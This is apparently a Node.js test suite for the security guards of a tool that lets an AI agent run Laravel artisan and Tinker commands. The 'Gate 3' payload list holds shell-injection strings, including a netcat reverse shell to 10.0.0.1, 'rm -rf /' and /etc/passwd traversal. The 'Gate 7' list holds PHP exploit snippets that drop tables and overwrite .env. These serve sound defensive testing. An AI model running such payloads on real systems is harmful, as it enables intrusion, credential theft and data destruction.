import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";

import {
  validateLaravelPath,
  checkEnvironment,
  classifyCommand,
  isCommandAllowed,
  sanitizeArgs,
  validateDangerousFlags,
  sanitizeTinkerCode,
  isPathSafe,
  isWriteAllowed,
  maskEnvValues,
} from "../utils/security.js";
import { RateLimiter } from "../utils/rate-limiter.js";
import { parseConfig } from "../utils/config.js";
import { initAuditLogger, logAudit } from "../utils/audit.js";
import { createBackup, writeFileContent } from "../utils/file.js";

// ============================================================================
// COMPREHENSIVE SECURITY AUDIT TEST SUITE (10-GATE SAFETY VERIFICATION)
// ============================================================================

test("Gate 1: Environment Safety Gate (Production Block)", () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "laravel-env-test-"));
  const envPath = path.join(tmpDir, ".env");

  // Production check -> MUST THROW FATAL ERROR
  fs.writeFileSync(envPath, "APP_NAME=Laravel\nAPP_ENV=production\n");
  assert.throws(
    () => checkEnvironment(tmpDir),
    /refuses to start when APP_ENV=production/i
  );

  // Capitalized PRODUCTION check
  fs.writeFileSync(envPath, "APP_ENV=\"PRODUCTION\"\n");
  assert.throws(
    () => checkEnvironment(tmpDir),
    /refuses to start when APP_ENV=production/i
  );

  // Staging check -> Allowed with stderr warning
  fs.writeFileSync(envPath, "APP_ENV=staging\n");
  assert.doesNotThrow(() => checkEnvironment(tmpDir));

  // Local check -> Allowed
  fs.writeFileSync(envPath, "APP_ENV=local\n");
  assert.doesNotThrow(() => checkEnvironment(tmpDir));

  fs.rmSync(tmpDir, { recursive: true, force: true });
});

test("Gate 2: Command Classification & Complete Blocklist Audit", () => {
  const dangerousCommands = [
    "migrate:fresh",
    "migrate:reset",
    "migrate:rollback",
    "migrate:refresh",
    "db:wipe",
    "down",
    "up",
    "tinker",
    "serve",
    "queue:restart",
    "event:generate",
    "vendor:publish",
    "schedule:run",
    "notifications:table",
    "session:table",
    "queue:table",
    "cache:table",
    "package:discover",
    "stub:publish",
  ];

  for (const cmd of dangerousCommands) {
    assert.equal(
      classifyCommand(cmd),
      "DANGEROUS",
      `Command '${cmd}' must be classified as DANGEROUS`
    );
    const check = isCommandAllowed(cmd);
    assert.equal(
      check.allowed,
      false,
      `Command '${cmd}' must be permanently blocked`
    );
  }

  // Arbitrary shell commands must automatically fall back to DANGEROUS
  const arbitraryCmds = ["eval", "system", "rm", "format", "powershell", "bash", "cat"];
  for (const cmd of arbitraryCmds) {
    assert.equal(classifyCommand(cmd), "DANGEROUS");
    assert.equal(isCommandAllowed(cmd).allowed, false);
  }
});

test("Gate 3: Shell Injection & Malicious Vector Filtering", () => {
  const attackPayloads = [
    "; rm -rf /",
    "&& shutdown /s",
    "| nc -e /bin/sh 10.0.0.1 4444",
    "`id`",
    "$(whoami)",
    "${PATH}",
    "arg > /tmp/hack.txt",
    "arg < /tmp/payload.txt",
    "arg\nrm -rf /",
    "arg\r\nrm -rf /",
    "arg\0.php",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
  ];

  for (const payload of attackPayloads) {
    assert.throws(
      () => sanitizeArgs([payload]),
      /Security Error/i,
      `Attack payload '${payload}' was not blocked by sanitizeArgs!`
    );
  }

  // Length overflow check
  assert.throws(() => sanitizeArgs(["a".repeat(256)]), /exceeds 255/);

  // Parameter count overflow check
  assert.throws(() => sanitizeArgs(Array(21).fill("arg")), /Too many arguments/);
});

test("Gate 4: Destructive Flag Interception", () => {
  // --force flag checks
  assert.throws(() => validateDangerousFlags("migrate", ["--force"]), /--force/);
  assert.throws(() => validateDangerousFlags("db:seed", ["--force"]), /--force/);
  assert.throws(() => validateDangerousFlags("key:generate", ["--force"]), /--force/);

  // --seed flag check on migrate
  assert.throws(() => validateDangerousFlags("migrate", ["--seed"]), /--seed/);

  // Destructive wildcards
  assert.throws(() => validateDangerousFlags("migrate", ["--drop-tables"]), /prohibited/i);
  assert.throws(() => validateDangerousFlags("migrate", ["--drop-views"]), /prohibited/i);
  assert.throws(() => validateDangerousFlags("migrate", ["--wipe"]), /prohibited/i);

  // Harmless flags allowed
  assert.doesNotThrow(() => validateDangerousFlags("migrate", ["--pretend"]));
  assert.doesNotThrow(() => validateDangerousFlags("route:list", ["--compact"]));
});

test("Gate 5: Path Traversal & Symlink Escape Prevention", () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "laravel-path-test-"));
  const appDir = path.join(tmpDir, "app");
  fs.mkdirSync(appDir, { recursive: true });

  // Valid paths inside root
  assert.equal(isPathSafe("app/Models/User.php", tmpDir), path.resolve(tmpDir, "app/Models/User.php"));

  // Traversal attacks
  assert.throws(() => isPathSafe("../../../etc/passwd", tmpDir), /Security Error/);
  assert.throws(() => isPathSafe("..\\..\\windows\\system32", tmpDir), /Security Error/);
  assert.throws(() => isPathSafe("/etc/passwd", tmpDir), /Security Error/);

  fs.rmSync(tmpDir, { recursive: true, force: true });
});

test("Gate 6: File Write Guard, Extension Whitelist & Auto-Backup System", async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "laravel-write-test-"));
  const appDir = path.join(tmpDir, "app", "Http", "Controllers");
  fs.mkdirSync(appDir, { recursive: true });

  // Whitelisted directory & extension
  assert.equal(isWriteAllowed("app/Http/Controllers/ProductController.php").allowed, true);
  assert.equal(isWriteAllowed("routes/api.php").allowed, true);
  assert.equal(isWriteAllowed("resources/views/welcome.blade.php").allowed, true);
  assert.equal(isWriteAllowed("config/services.php").allowed, true);

  // Blacklisted directory / files
  assert.equal(isWriteAllowed(".env").allowed, false);
  assert.equal(isWriteAllowed("vendor/autoload.php").allowed, false);
  assert.equal(isWriteAllowed("node_modules/express/index.js").allowed, false);
  assert.equal(isWriteAllowed("artisan").allowed, false);
  assert.equal(isWriteAllowed("composer.json").allowed, false);
  assert.equal(isWriteAllowed("storage/logs/laravel.log").allowed, false);
  assert.equal(isWriteAllowed("public/index.php").allowed, false);

  // Blacklisted extension
  assert.equal(isWriteAllowed("app/exploit.sh").allowed, false);
  assert.equal(isWriteAllowed("app/malware.exe").allowed, false);

  // Test Auto-Backup execution
  const testFile = path.join(appDir, "TestController.php");
  fs.writeFileSync(testFile, "<?php // Original Content");

  const { backupPath } = await writeFileContent(testFile, "<?php // Updated Content", tmpDir);

  assert.ok(backupPath, "Backup path must be generated");
  assert.ok(fs.existsSync(backupPath), "Backup file must exist on disk");
  assert.equal(fs.readFileSync(backupPath, "utf-8"), "<?php // Original Content");
  assert.equal(fs.readFileSync(testFile, "utf-8"), "<?php // Updated Content");

  fs.rmSync(tmpDir, { recursive: true, force: true });
});

test("Gate 7: Tinker Code Sandbox & Exploit Mitigation", () => {
  // Safe snippets
  assert.equal(sanitizeTinkerCode("User::first();").safe, true);
  assert.equal(sanitizeTinkerCode("config('app.name');").safe, true);
  assert.equal(sanitizeTinkerCode("collect([1, 2, 3])->map(fn($n) => $n * 2);").safe, true);

  // System command execution exploits
  assert.ok(!sanitizeTinkerCode("exec('whoami');").safe);
  assert.ok(!sanitizeTinkerCode("system('ls -la');").safe);
  assert.ok(!sanitizeTinkerCode("passthru('id');").safe);
  assert.ok(!sanitizeTinkerCode("shell_exec('cat /etc/passwd');").safe);
  assert.ok(!sanitizeTinkerCode("popen('cmd', 'r');").safe);

  // File modification exploits
  assert.ok(!sanitizeTinkerCode("unlink('app/Models/User.php');").safe);
  assert.ok(!sanitizeTinkerCode("file_put_contents('.env', 'HACKED');").safe);

  // Database destruction exploits
  assert.ok(!sanitizeTinkerCode("DB::statement('DROP TABLE users');").safe);
  assert.ok(!sanitizeTinkerCode("Schema::drop('users');").safe);
  assert.ok(!sanitizeTinkerCode("User::truncate();").safe);
});

test("Gate 8: Rate Limiter & Flood Prevention", () => {
  const limiter = new RateLimiter({
    maxRequestsPerMinute: 5,
    maxRequestsPerHour: 100,
    cooldownMs: 0,
  });

  for (let i = 0; i < 5; i++) {
    assert.equal(limiter.checkRateLimit().allowed, true, `Request #${i + 1} should be allowed`);
    limiter.recordRequest();
  }

  // 6th request MUST be blocked
  const check = limiter.checkRateLimit();
  assert.equal(check.allowed, false, "Request #6 must be blocked by rate limiter");
  assert.ok(check.reason?.includes("limit of 5 requests per minute exceeded"));
});

test("Gate 9: Audit Logger (.jsonl persistence & format)", () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "laravel-audit-test-"));
  const sessionId = initAuditLogger(tmpDir);

  assert.ok(sessionId, "Session ID must be initialized");

  logAudit({
    tool: "run_artisan",
    tier: "CAUTIOUS",
    command: "make:model",
    args: ["Product"],
    status: "ALLOWED",
    exitCode: 0,
  });

  logAudit({
    tool: "run_artisan",
    tier: "DANGEROUS",
    command: "migrate:fresh",
    status: "BLOCKED",
    reason: "Permanently blocked",
  });

  const auditFile = path.join(tmpDir, ".laravel-mcp-audit.jsonl");
  assert.ok(fs.existsSync(auditFile), "Audit log file must be created on disk");

  const lines = fs.readFileSync(auditFile, "utf-8").trim().split("\n");
  assert.equal(lines.length, 2, "Must contain exactly 2 audit log entries");

  const entry1 = JSON.parse(lines[0]);
  assert.equal(entry1.tool, "run_artisan");
  assert.equal(entry1.command, "make:model");
  assert.equal(entry1.status, "ALLOWED");

  const entry2 = JSON.parse(lines[1]);
  assert.equal(entry2.command, "migrate:fresh");
  assert.equal(entry2.status, "BLOCKED");

  fs.rmSync(tmpDir, { recursive: true, force: true });
});

test("Gate 10: Dry-Run Mode & CLI Argument Configuration", () => {
  const config = parseConfig([
    "node",
    "index.js",
    "/path/to/laravel",
    "--dry-run",
    "--allow-write",
    "--rate-limit",
    "50",
  ]);

  assert.equal(config.dryRun, true);
  assert.equal(config.allowWrite, true);
  assert.equal(config.rateLimit, 50);
});
